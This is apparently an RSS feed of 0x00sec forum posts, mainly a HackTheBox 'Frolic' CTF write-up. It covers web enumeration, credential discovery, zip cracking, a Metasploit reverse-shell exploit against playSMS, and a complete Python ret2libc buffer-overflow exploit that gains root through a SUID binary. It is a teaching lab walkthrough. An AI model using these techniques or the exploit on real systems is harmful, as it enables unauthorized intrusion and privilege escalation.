<img src="https://0x00sec.s3.amazonaws.com/original/2X/f/fbed9d6ad3e5a016f8d17ea1d81acca8d0c7b1d6.png" alt="grafik" data-base62-sha1="zWEVPejcH2cKwU2LnUaApzGTrQa" width="378" height="310"></p>
<p>If you open this Help page, you will see the information you need. These are the steps we did just additionally we improved our research skills.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5383b1594b79e20cd6d0936f29b3dce1fa649a50.png" alt="grafik" data-base62-sha1="bUNMofKmiuPfZR4hHj04hGDdzA4" width="567" height="487"></p>
<h2>14. Challenge</h2>
<p>Escalate your privileges by using the user <strong>Nico</strong> instead of <strong>Tom</strong> and create a new graph with modified ownership.</p>
<p>I highly recommend watching <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA" rel="noopener nofollow ugc">IppSec</a> videos on YouTube!</p>
<hr>
<blockquote>
<p>YouTube video: <a href="https://www.youtube.com/watch?v=Xq2EQRfj3Gs" rel="noopener nofollow ugc">https://www.youtube.com/watch?v=Xq2EQRfj3Gs</a></p>
</blockquote>
<p>Best regards,<br>
Cry0l1t3<br>
<a href="https://0x00sec.s3.amazonaws.com/original/2X/2/27a1e485297c69c94c88fe38429dddd5c839d998.png" class="onebox" target="_blank" rel="noopener nofollow ugc">https://0x00sec.s3.amazonaws.com/original/2X/2/27a1e485297c69c94c88fe38429dddd5c839d998.png</a></p>
            <p><small>1 post - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/htb-shell-affect-reel-writeup/12930">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/htb-shell-affect-reel-writeup/12930</link>
          <pubDate>Thu, 11 Apr 2019 06:47:22 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-12930</guid>
          <source url="https://0x00sec.org/t/htb-shell-affect-reel-writeup/12930.rss">[HTB] SHELL AFFECT - Reel - WriteUp</source>
        </item>
        <item>
          <title>Learn to hack stuff!</title>
          <dc:creator><![CDATA[swapnil_pathak]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <p>I recently started a blog to share what I have read, performed and created to do better at hacking stuff. Currently, I have a few HackTheBox write-ups. I am looking for topics that I could expand on and share with the community. I am not promoting my blog in any way. I mean to create a platform where beginners can read (so that they do not spend unnecessary hours trying to figure out why things don’t work) and apply that knowledge in CTFs.</p>
<p>Please feel free to review it and let me know about any suggestions.</p>
<p><a href="https://swapnil-pathak.github.io/" class="onebox" target="_blank" rel="nofollow noopener">https://swapnil-pathak.github.io/</a></p>
            <p><small>10 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/learn-to-hack-stuff/12888">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/learn-to-hack-stuff/12888</link>
          <pubDate>Tue, 09 Apr 2019 15:07:14 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-12888</guid>
          <source url="https://0x00sec.org/t/learn-to-hack-stuff/12888.rss">Learn to hack stuff!</source>
        </item>
        <item>
          <title>HackTheBox Writeup: Frolic</title>
          <dc:creator><![CDATA[Baud]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <p><img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1f9ea27e1adefdbb29e984d3bdd363ecee346c9d.png" alt="image" data-base62-sha1="4vIFQt3RHeHCftrXjG4fqOQy6n3" width="312" height="91"></p>
<p>Hello nullers, today I’m bringing you the writeup of a very interesting CTF challenge that has just been retired from HackTheBox: Frolic. Despite this box being rated as “Easy” it’s one of those challenges that can easily become frustrating because of rabbit holes, weird messages, and overall not-so-realistic aspects that can be downright confusing, but after all this we get to exploit a very fun and sort of realistic buffer overflow vulnerability through a ret2libc attack that allows us to leverage our permissions and become root on the system, so I’d say it’s a great box to learn new things regarding exploit writing and it can also teach a few tricks that can be used on other CTF-y and less realistic boxes, so all experience is good.</p>
<p>I’m also going to explain some theory regarding the buffer overflow attack we are going to launch, so don’t worry if you never wrote one yourself before, although you might find that part boring if you’re already a good stack smasher. But enough with the talking and let’s start hacking. Actually… before we do that, let’s start enumerating!</p>
<p><strong>Drawing  the perimeter:</strong></p>
<p>When I first approach a new box I like to scan every possible port with masscan and then pass the results to nmap to enumerate the discovered services more deeply, but in this case a standard nmap scan returns all the results we need so let’s not overcomplicate things from the start, here is the command I typically use:</p>
<pre><code>nmap -sS -sV -sC 10.10.10.111
</code></pre>
<p>If you’re not familiar with nmap flags:</p>
<ul>
<li>-sS will run a TCP SYN scan, which is faster and stealthier than a full open port scan</li>
<li>-sV will attempt to enumerate name and version of the services running behind the discovered ports</li>
<li>-sC will execute a few useful selected NSE scripts against the target to tell us a bit more about services like HTTP, SMB, SSH, and more. It can find some valuable information, and in this phase we must discover as much as possible about the target</li>
</ul>
<p>The output reveals some interesting ports:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b609525363724202a5b97e51e6b1b6c00f9aa0de.png" alt="image" data-base62-sha1="pYmS0dIfQJtvvVdSLiTCxqf1OSq" width="583" height="500"></p>
<p>We have SSH, SMB, and even an nginx web server running on port 9999, which is very unusual. If we wanted we could list available SMB shares with smbclient like this:</p>
<pre><code>smbclient -L 10.10.10.111
</code></pre>
<p>But we would only see default shares that cannot be accessed with a NULL session, so we have to look elsewhere. What about that suspicious looking nginx server? What is it hiding?</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/03f4f9ff9c5ad6d086a5c1d00b6c27c13ca833fc.png" alt="image" data-base62-sha1="z0i7suw0brlgMd1m3Dif4xxMNm" width="626" height="228"></p>
<p>Well… nothing apparently, the source code doesn’t even contain comments or links to useful resources, this looks like a normal default configuration of nginx. But it isn’t just that, not even in the slightest. We can find out why by firing up our favorite web content discovery tool, I use dirb with the default common.txt dictionary it comes with, it works well for most occasions:</p>
<pre><code>dirb http://10.10.10.111:9999/ -R
</code></pre>
<p>By default dirb will scan content recursively, so whenever it finds a new folder it will start iterating through the entire dictionary inside the new folder in the hope of finding more files or sub-directories, but this can result in some very noisy and useless output we don’t need, for example when a directory containing a manual in multiple languages is found, so the -R flag tells dirb to ask us if we want to enter a new directory and start a new scan, this way we can only make it scan the directories we are interested in and not waste any time. Anyway it turns out the server is actually hiding something:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7e017e962bd0d646d80a8fc24c016acb548c2ea1.png" alt="image" data-base62-sha1="hYHmw4ES3pnSzpYLqjE8Q4c06Cl" width="623" height="455"></p>
<p>I’m going to start from the bottom. The /test/ directory just takes us to a phpinfo() output, the only interesting things we can spot between all this output are the versions of PHP and Ubuntu, so now we know what OS Frolic uses and what version too:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0540736fac72d6f41ef972e859544794376a583c.png" alt="image" data-base62-sha1="KstjvCOuCzsCzOcwAmoumd2kXy" width="690" height="174"></p>
<p>/dev/ on the other hand is much more intriguing, because it just shows us a 403 Forbidden code. We’ll come back here later.<br>
/backup/ shows what pretends to be a directory listing:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5436c76b11e059d8ca221dbda09f03474b062f0a.png" alt="image" data-base62-sha1="c0ZtchaULvvcFZ13rb6fespxb7A" width="234" height="33"></p>
<p>In fact password.txt and user.txt (no, it’s not the flag) are actual files inside this /backup/ folder, which we can open to reveal a pair of credentials:</p>
<pre><code>user - admin
password - imnothuman
</code></pre>
<p>The loop/ folder is just a folder that… loops. Yeah. Rabbit hole, just ignore and move on. The only place where we could use these so far is SSH, but they won’t work. Time to keep examining our dirb output. The last directory we haven’t checked yet is /admin/, where interestingly we find a very enticing login form:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3e26680ae1862bcaf76e18d14abce751a6a52ef2.png" alt="image" data-base62-sha1="8RNT5wH7MaUqmRcDHKeQxUjNxv4" width="407" height="363"></p>
<p>And no, our credentials don’t work here either, but instead of showing off our bruteforcing and SQL injection skills we can just take a calm look at the source code of this page to find something juicy to say the least:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3030c3e13176e29f93cd45ed1dff8a55681a55fe.png" alt="image" data-base62-sha1="6SjoDM422Ug7O0h8Pq69NZ6JFpQ" width="551" height="403"></p>
<p>A JavaScript file is being included in this page from /admin/js/, and things get even more interesting once we open the script (I made it more readable because the lack of proper spacing really bothered me):</p>
<pre><code class="lang-auto">var attempt = 3; // Variable to count number of attempts.
// Below function Executes on click of login button.

function validate()
{
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;

    if ( username == "admin" &amp;&amp; password == "superduperlooperpassword_lol")
    {

        alert("Login successfully");
        window.location = "success.html"; // Redirecting to other page.
        return false;
    }

    else
    {
        attempt--;// Decrementing by one.
        alert("You have left " + attempt + " attempt");
        // Disabling fields after 3 attempts.

        if( attempt == 0)
        {
            document.getElementById("username").disabled = true;
            document.getElementById("password").disabled = true;
            document.getElementById("submit").disabled = true;
            return false;
        }
    }
}
</code></pre>
<p>The script itself gave us the credentials we need to login!</p>
<pre><code>User: admin
Pass: superduperlooperpassword_lol
</code></pre>
<p>So let’s see what we find behind this admin “portal”: we are redirected to a page called success.html and all we can see is this:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7b6cc22f731d6ca23207feb232af265b65d6cd39.png" alt="image" data-base62-sha1="hBRK3V00ztfzdrq3jfzyyHyBpYR" width="690" height="83"></p>
<p>Looks pretty weird, and definitely not humanly readable. This is probably the worst part of the entire challenge because what we have here is the source code of a program written in a dialect of an uncommon esoteric programming language (and by "dialect" I mean "shorter version of the language"). Esoteric languages are not created to be used efficiently, rather they try to be as unique, confusing, or weird as possible, mostly just for a laugh. This one in particular is called Ook! and luckily we can find an <a href="https://www.dcode.fr/ook-language" rel="noopener nofollow ugc">online interpreter</a> where to paste the source code and get its output:</p>
<pre><code>Nothing here check /asdiSIAJJ0QWE9JAS
</code></pre>
<p>We decide to listen to that suggestion and we go to 10.10.10.111:9999/asdiSIAJJ0QWE9JAS where in fact we find something:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/05bceef7f00df4dabcb72c2b7bf58538cad3aefe.png" alt="image" data-base62-sha1="OLaSpNfFr45mSKKDPHrt1oTS34" width="690" height="75"></p>
<p>Good, more nonsense. But this one is actually much easier to guess, if you’ve seen a few Base64 strings you’ll have recognized it, its alphabet and pattern are pretty unique. However if you paste this long string on a decoder that only shows ASCII outputs you will receive an error, because this is not a Base64 encoded string, it’s Base64 encoded binary data! So we need to decode this string into a file, we can do it from terminal:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cedf5c99fdcdb5d828ea403d6c8f89a0f929f225.png" alt="image" data-base62-sha1="tw4UmXYDeLMt1Rrab7XviGm4iod" width="645" height="103"></p>
<p>In the first step I opened nano, a CLI text editor, and pasted the Base64 string after removing all the blank characters (if you leave them in you won’t be able to decode the string). Then I used the base64 utility to decode the content of the file where I saved the string, redirecting the output to a new file which revealed itself as a compressed archive. However there is one tiny issue… it’s password protected:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/dc5db59ff54cf4c1c5bc99cd89ddeb51c5b69d99.png" alt="image" data-base62-sha1="vrrOxj7o8wlr1c4Qqm14q7oYj0d" width="319" height="61"></p>
<p>Fear not though, the issue really is tiny for a reason… the password is just “password”, it’s easily guessable. But because we are discussing password protected Zip archives I’m still going to show a <a href="https://github.com/hyc/fcrackzip" rel="noopener nofollow ugc">neat tool</a> to launch a dictionary attack against archives that may have a somewhat less stupid password. Example usage:</p>
<pre><code>fcrackzip -D -p ../rockyou.txt -u frolic_out
</code></pre>
<p>Anyway now that we can unzip the file we can see the content of index.php, the only file we could find in the archive, which in reality is just a normal text file disguising itself as a PHP page:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a889c7fd5c1f6a2da423111a867e803f03c5525d.png" alt="image" data-base62-sha1="o2XppIq2nK6RYohZvbAkLKf4CRv" width="690" height="202"></p>
<p>That is clearly a hexadecimal string, when we run into these strings the way to make them readable is almost every time to convert them into ASCII, as we can guess this was just a normal string of which every character has been rewritten as its hexadecimal value. A random online converter like <a href="https://www.asciitohex.com" rel="noopener nofollow ugc">this</a> will do the job. This is what we get:</p>
<pre><code>KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKy4tLS0gLS0uKysgKysrKysgLjwrKysgWy0+KysgKzxdPisKKysuPCsgKytbLT4gLS0tPF0gPi0tLS0gLS0uLS0gLS0tLS0gLjwrKysgK1stPisgKysrPF0gPisrKy4gPCsrK1sgLT4tLS0KPF0+LS0gLjwrKysgWy0+KysgKzxdPisgLi0tLS4gPCsrK1sgLT4tLS0gPF0+LS0gLS0tLS4gPCsrKysgWy0+KysgKys8XT4KKysuLjwgCg==
</code></pre>
<p>Oh look, another Base64 string! Will we ever get anywhere with this? Decode this one too:</p>
<pre><code>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ +.--- --.++ +++++ .&lt;+++ [-&gt;++ +&lt;]&gt;+
++.&lt;+ ++[-&gt; ---&lt;] &gt;---- --.-- ----- .&lt;+++ +[-&gt;+ +++&lt;] &gt;+++. &lt;+++[ -&gt;---
&lt;]&gt;-- .&lt;+++ [-&gt;++ +&lt;]&gt;+ .---. &lt;+++[ -&gt;--- &lt;]&gt;-- ----. &lt;++++ [-&gt;++ ++&lt;]&gt;
++..&lt;
</code></pre>
<p>And this looks a little more cryptic. If you’ve already dug deep enough in the realm of esoteric programming languages you might have recognized this already, it’s a BrainFuck program. So just like with Ook! we can look for an <a href="https://copy.sh/brainfuck/" rel="noopener nofollow ugc">online interpreter</a> where to paste and execute this code, which gives us as output:</p>
<pre><code>idkwhatispass
</code></pre>
<p>So we went through all this trouble only for a string that we don’t know where to use and what it represents. Well to be fair it’s pretty easy to guess it could be a password, so we’ll go with that. But where can we use it? It still doesn’t work on SSH, so we’re still missing something. But not really, we just left it behind for later. Remember that /dev/ folder, the one that we couldn’t access because of the Forbidden HTTP message? We didn’t try running a dirb scan in there, I wonder if we can find something…</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/22b18f9fb4ccef4fe7e616efda0029750424fb28.png" alt="image" data-base62-sha1="4WUEIxFPzTP6ZPkSgTk51PbLvNS" width="551" height="83"></p>
<p>We did find indeed. The file called “test” is literally just a text file with “test” written on it, nothing interesting. However that /backup/ folder…</p>
<pre><code>/playsms
</code></pre>
<p>We are presented with this, a name for another folder. So if we connect to <a href="http://10.10.10.111:9999/playsms:" rel="noopener nofollow ugc">http://10.10.10.111:9999/playsms:</a></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/917892858f3e369d6de1e83ab908c9341cd49771.png" alt="image" data-base62-sha1="kKTyC2QB7jMo3XvxcuATzyWd2WB" width="319" height="300"></p>
<p>We find a whole web application! Now we can finally test our credentials, and it turns out that “imnothuman” password is completely useless, while the “admin” username from user.txt and the “idkwhatispass” password from the BrainFuck program grant us access to the application:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a1f32018cc117213fecd4e6303dc6397f3ce8ea6.png" alt="image" data-base62-sha1="n6FLwhCIwEMDmpMNKpjrmbmqOUu" width="614" height="225"></p>
<p>The first thing I do when I login on a new web application is look for version numbers, useful features, and command injection vulnerabilities, but usually looking for public exploits before doing anything else is a good habit. Let’s see if metasploit has any modules to attack playSMS in its database:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d56c594c8997fa86ad8131ffba1fec682fbce09b.png" alt="image" data-base62-sha1="us1PVjujret742hwuX30UxKMqoz" width="690" height="109"></p>
<p>We found two, and even if they were released on the same day to target the same versions I have only found the second module to work against the box. As we can see from the description this exploit requires authentication so even if we found the application earlier we couldn’t exploit it until now.</p>
<p><strong>First exploitation, getting user:</strong></p>
<p>The module of our choice is very straightforward, I highlighted the options that need to be changed:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/fc5b5f3165fe1af7fbd06918765f6720e6c351c7.png" alt="image" data-base62-sha1="A0s5jWy7HAAPqqkrrHMc9Wl7dmD" width="690" height="300"></p>
<p>The picture above is part of the output of a “show info” command, but if we type “show options” we also get information regarding the default payload of the exploit and its settings, in this case the module includes a PHP reverse TCP meterpreter shell so we only have to specify our IP inside the HTB network and a port to start our listener:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9d7b4bfc562a86db13a12f5411e06faf2e12e3f1.png" alt="image" data-base62-sha1="mt97KNnzBGY4CdWO4JRjnm3fRst" width="690" height="116"></p>
<p>We already know everything we need to launch the exploit, so it only takes a few seconds to land successfully on the box:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6c5bbf028bbaee44030115cd5a15901e42391d2b.png" alt="image" data-base62-sha1="fsA8bn9TFe1FkFVnlPmHnclqnaz" width="690" height="336"></p>
<p>Now we should look for our first flag. Here I like to spawn a normal shell instead of using meterpreter’s weird commands, and because we receive a non-interactive bash shell I use Python to spawn a new instance of /bin/bash that makes our job a little easier, then I look at the content of the /home/ folder to see what users there are on the box, and inside the Ayush folder we find our user.txt flag, and also a curious little hidden folder that we would have missed without the “-la” option:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7f2e451b825f1bd4fad564632bc1edb61ee1d883.png" alt="image" data-base62-sha1="i95LQg9uyD34X2GMuL3GwNm1TPl" width="690" height="331"></p>
<p>Let’s see what it contains then:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4df27b36614d44f317356395032235d8b200c760.png" alt="image" data-base62-sha1="b7yhiw3KI3Qg7WdjHM7kW7NuBRS" width="440" height="128"></p>
<p>We only have one executable, but by looking carefully we spot the "s" between its permissions, meaning the program has the SUID bit set and can be run with root privileges, weird coincidence. We should take a closer look by downloading it on our own box for further testing:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2c82d5942808b9b07efd3b27ef157472eea5494c.png" alt="image" data-base62-sha1="6lLjPBKI3rPIcojrNix2o1WpzNG" width="530" height="147"></p>
<p><strong>Some theory on buffer overflows:</strong></p>
<p>Now that we have the binary on our VM we can run it to see how it works:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c6d38b2fe956955c427b6ccefa4c5b1d800decb4.png" alt="image" data-base62-sha1="smTLHI1wWb06hramwZuP8NVIWSE" width="690" height="139"></p>
<p>Apparently this program asks for a message that is taken from its command line arguments and then sends it somewhere in some way (it doesn’t matter for this box), and once that is done the same message is printed back on stdout to communicate a successful operation. The most interesting part about all this though is how this behavior makes it vulnerable to a buffer overflow, in fact the error I received in the last line of output is a segmentation error, which means the program has just tried to access an invalid memory address, or one that it is not supposed to access at all. This is not too surprising considering the binary is called “rop”, which is short for Return-Oriented Programming, a technique used to bypass common buffer overflow mitigation techniques (although it’s not needed in this box).</p>
<p>If you’re not familiar with buffer overflow vulnerabilities, this happens because the program is trying to copy data that it receives as input into a fixed length area of memory without making proper checks about the size of that data, so if we give the program a bigger bunch of data than the variable that is supposed to contain it said data will literally overflow and overwrite nearby memory addresses.</p>
<p>Local variables are saved in a memory segment called stack, and in the same memory segment, not too many bytes away from our local variables, we also have a 4 bytes long value (on x86 architectures at least) that is supposed to be the memory address the CPU will have to jump to when returning from the current function, so technically it’s the address of the instruction after the call to the function we’re in right now.</p>
<p>I used Python to give our rop binary a string of 100 characters as input, and we received a segmentation error because the string was so long it overwrote the return address of the function on the stack, so when the function returned the CPU tried to access a memory address that looks like this: 0x41414141 (41 is “A” in hexadecimal), an address that the program cannot access, so it exited with an error. Our goal is to overwrite that return address with one that points to some useful instructions, granting us arbitrary code execution. If this sounds confusing and you never programmed in C before I suggest you to study this beautiful language and practice it for some time, it’s essential in order to exploit flaws like this, so from now on I’m going to assume you already understand the basic concept of a simple buffer overflow vulnerability. I also recommend to read a thing or two about <a href="https://aaronbloomfield.github.io/pdr/book/x86-32bit-ccc-chapter.pdf" rel="noopener nofollow ugc">gcc’s x86 calling convention</a>, it’s what dictates how functions must be called and where the parameters are expected to be in memory, these are all things we must keep in mind while writing a buffer overflow exploit.</p>
<p>So we know we have a binary vulnerable to a buffer overflow, which also happens to have the SUID bit set, this is very useful because if we manage to spawn a shell through the buffer overflow that shell will be run as root, and we’ll get to grab the last flag. It’s clear that this is the right path to follow, so it’s time to get our hands dirty. For exploit development on Linux I use GDB + Peda.py, which offers many incredibly useful features for our scope. You can download Peda.py <a href="https://github.com/longld/peda" rel="noopener nofollow ugc">here</a>. When everything is ready we can load the program and run the “checksec” command to see which security measures are enabled on the binary, we’ll have to consider different approaches based on what we find:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/c3593d829fde87344502419a485336309854705a.png" alt="image" data-base62-sha1="rS8iNhDxlKO9M3xySlley5lPvpU" width="590" height="169"></p>
<p>NX is enabled, and NX means the stack is not executable. In the most basic case of a buffer overflow exploit a shellcode is injected in the overflowing buffer and the return address is overwritten with a pointer to that shellcode, which will cause it to execute as soon as the function tries to return to its original caller. Because the shellcode is being saved inside the buffer it will end up on the stack, and one of the many mitigation techniques that try to prevent these attacks is the NX bit, which marks the entire stack region as non-executable, so the CPU can only read and write data on the stack, but it cannot execute instructions from it. This makes us unable to inject shellcode in the buffer, but there are workarounds.</p>
<p>If we have control of the return address we can set its value as whatever we please, so we can make it point to a bunch of instructions that our program is going to load at runtime anyway, and they are being loaded with the only purpose of being executed, so NX can’t do anything to prevent this attack. Every dynamically linked C program in Linux copies in its address space a dynamic library called libc, which contains many useful functions used to interact with the operating system, one of which is system(), that can run shell commands. An attack that uses libc functions to exploit a buffer overflow is called a ret2libc, because we are going to overwrite the return address with the memory address of the system() function to make it spawn a new shell.</p>
<p><strong>Gathering all the pieces:</strong></p>
<p>Alright, that’s enough theory for now. Let’s go back to work. We know what attack we want to launch, but we also need to know if ASLR (Address Space Layout Randomization) is enabled on the box, because if it is then memory regions will be allocated at random addresses every time and it would make our exploit more complicated. To find out if ASLR is enabled we can use “ldd” to show which dynamic libraries the rop binary loads during runtime, their memory addresses will be shown, if we run the command multiple times and the addresses never change ASLR is disabled and we can copy the address of the libc library because we’re going to need it for our exploit:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/ed602489560621ddaedb0c49a60d733e47950319.png" alt="image" data-base62-sha1="xRV90D59YAZiAg1H9pnzw0tZDcJ" width="620" height="400"></p>
<p>The address stays the same! Good, let’s write it down for later:</p>
<pre><code>libc_base_address = 0xb7e19000
</code></pre>
<p>This is the address where the code of libc begins in memory when our program is being executed. Because it’s part of our binary’s address space we are authorized to access it anytime. Next we should find the specific address of the system() function: this task would be very easy if gdb was installed on Frolic, however we don’t have it at hand, but there are still other ways to find the addresses we need. I’m going to do it by using objdump:</p>
<pre><code>objdump -TC /lib/i386-linux-gnu/libc.so.6 | grep " system$"
</code></pre>
<p>This command will output the offset where system() is located inside libc (I got the path of the library from the output of ldd above), so it’s not an absolute memory address, in order to know where system() will be loaded during runtime we need to add the offset to the base address we found above:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2929b56bde3b685b3cd3629b65b2d7f9254ee3ee.png" alt="image" data-base62-sha1="5S8W4JVs9fvoqnGRl6KjYmLp9Zs" width="690" height="58"></p>
<pre><code>system_address = libc_base_address + system_offset = 0xb7e19000 + 0x0003ada0 = 0xb7e53da0
</code></pre>
<p>Great, we have the address that will be loaded inside the EIP register to redirect execution! However system() needs an important parameter to work, which is the path of the program to be called. Since we want to spawn a shell the call to system() must look like this:</p>
<pre><code>system("/bin/sh")
</code></pre>
<p>The x86 calling convention says that function parameters must be passed on the stack, and when the parameter is a string a pointer to the string must be pushed on the stack instead, so we must find a pointer to the “/bin/sh” string to set on the stack so that system() will take it as parameter and execute it. This time we can do it with the “strings” command, by looking for the offset of that string inside the libc library our rop binary uses on the box:</p>
<pre><code>strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep '/bin/sh'
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/9/9be6a251dd3c614921455d773087600e87171572.png" alt="image" data-base62-sha1="mfa8CLF0JKHhXWgn3SVDsIGHSCu" width="690" height="56"></p>
<p>And there we go, we have found another offset. Like before we can calculate where the string will be loaded at runtime with a simple addition:</p>
<pre><code>string_address = libc_base_address + string_offset = 0xb7e19000 + 0x0015ba0b = 0xb7f74a0b
</code></pre>
<p>The last memory address we need to write our exploit is a fake return address, because we are trying to emulate a proper call to a new function and the calling convention states we must provide a return address that will be used to pick up execution once the function we are trying to call exits. This isn’t something we should worry about though, it can be 4 bytes of junk, they will cause the program to crash when we close our shell but they won’t have any effect for as long as we are running it, so it doesn’t matter:</p>
<pre><code>exit_address = 0xaabbccdd
</code></pre>
<p>There, now we have all the addresses we need. We’re only missing one important piece: where the hell is the return address we want overwrite? Of course we need to know where it is in order to change its value, so let’s get to it, I’m going to use GDB + Peda.py and this will make it very fast. The way to do it is very simple, first we generate a very long pattern of characters which never repeat, then we feed the program with that pattern and we observe which characters overwrite the EIP register, those will be the characters that overwrote the return address, so if we get the offset of those characters from the full pattern we will know exactly how many bytes of data we need to reach the return address. Peda already has a built-in command to generate such patterns, so I’m going to load the rop binary on GDB, generate a pattern, give it as input to the program, and see what happens:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/34372c92b6ff60f5d5d82a743971942dd21181ed.png" alt="image" data-base62-sha1="7rV2nPjVmIhfpJTLpAVP3NVXUOp" width="690" height="84"></p>
<p>The program crashed, in fact Peda will cover the terminal with the current state of every register, the stack, and some instructions found near the current content of EIP:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/bd81682e20262e4697ea4eec7c3c11cc960ee9d8.png" alt="image" data-base62-sha1="r2ruGUDQXhBNTOZVSbYLvA7Tncs" width="690" height="329"></p>
<p>The content of EIP at the moment of the crash is 0x41474141, which is a little endian hexadecimal representation of the string "AAGA", so part of the pattern definitely overwrote the return address, and we can see a big portion of the stack has been overwritten with our pattern as well. What offset of the string reached EIP though?</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/56dba2e4a13d7d86c8e9c0c464e14000ff70c8b3.png" alt="image" data-base62-sha1="conD7O6zmIIou8BoGIPwrojyNgL" width="274" height="61"></p>
<p>Well here we have our answer, the string “AAGA” begins exactly 52 bytes after the start of the original pattern, so in our exploit we are going to need 52 bytes of garbage before we can inject our malicious return address. And this is really it, we finally have every piece of information we need to write our exploit!</p>
<p><strong>Writing the exploit:</strong></p>
<p>I like to write my exploits in Python so I went for this language. Here is the final result, where all I do is implementing the calling convention to trick the CPU into calling the system() function with the string “/bin/sh” as its only parameter and using a bogus return address:</p>
<pre><code class="lang-python">import struct  

# addresses from Frolic:
"""
system_address = struct.pack("&lt;I", 0xb7e53da0)
exit_address = struct.pack("&lt;I", 0xaabbccdd)
string_address = struct.pack("&lt;I", 0xb7f74a0b)
"""

# addresses from Kali to test it locally:
system_address = struct.pack("&lt;I", 0xf7e0d980)
exit_address = struct.pack("&lt;I", 0xaabbccdd)
string_address = struct.pack("&lt;I", 0xf7f4daaa)

# fill the buffer with junk:
buffer = "A" * 52

# place the arguments for the call to system() on the stack, following the order defined by the calling convention:
buffer += system_address
buffer += exit_address
buffer += string_address

# finally feed the program with the malicious payload
print buffer
</code></pre>
<p>If you’re wondering what all those struct.pack functions do they convert the hexadecimal addresses we give them into little endian ("&lt;I") arrays of bytes because we are dealing with a x86 CPU, so the little endian notation must be used. Also notice that I obtained the memory addresses of system() and of “/bin/sh” from my Kali box as well so I could test the exploit locally before uploading it, if you want to do that too you should remember to disable ASLR because it’s enabled by default on modern kernels, to do that run this command:</p>
<pre><code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
</code></pre>
<p>ASLR will be re-enabled automatically as soon as the system is rebooted, or you can just echo 2 instead of 0 into the same file when you’re done messing with the exploit. Let’s test it now and see if our Python script works:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0960f62db220ed2a0b7cce120a5f8fb28bc7557f.png" alt="image" data-base62-sha1="1kY2gBFhgnqXSH7AT6TTF3IMRt5" width="366" height="116"></p>
<p>It does! As soon as we feed the output of our exploit to ./rop we enter a root shell! And just as we expected, exiting causes another segfault because the program is trying to jump back to the junk return address we provided.</p>
<p><strong>Privilege escalation using the custom exploit:</strong></p>
<p>Let’s upload this sexy exploit to the box after removing the comments from the original addresses and see if it works there as well:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/3/3cfc69012145343e43d161b0b233a0b2c50539a8.png" alt="image" data-base62-sha1="8HvqWkyVnonUQ02ZqHrbLh7dSaY" width="639" height="292"></p>
<p>And the system got owned! A quick summary of these last few actions I performed:</p>
<ol>
<li>I changed directory to /tmp in order to have write permissions in the working directory, then uploaded the exploit</li>
<li>I started a shell session from the meterpreter command line</li>
<li>Because the obtained shell isn’t interactive I spawned a semi-interactive one through a Python one-liner</li>
<li>I run the program in Ayush’s home folder</li>
<li>BAM! Rooted!</li>
</ol>
<p>I thought this was a really fun box, especially the privilege escalation part because I love software exploitation and I wish there were more boxes on HTB that required it. Although maybe I would have given 30 points for this, not just 20, but oh well it’s too late now. If you have any questions let me know in the comments, I hope you enjoyed this writeup.</p>
            <p><small>9 posts - 6 participants</small></p>
            <p><a href="https://0x00sec.org/t/hackthebox-writeup-frolic/12478">Read full topic</a></p>
          ]]></description>
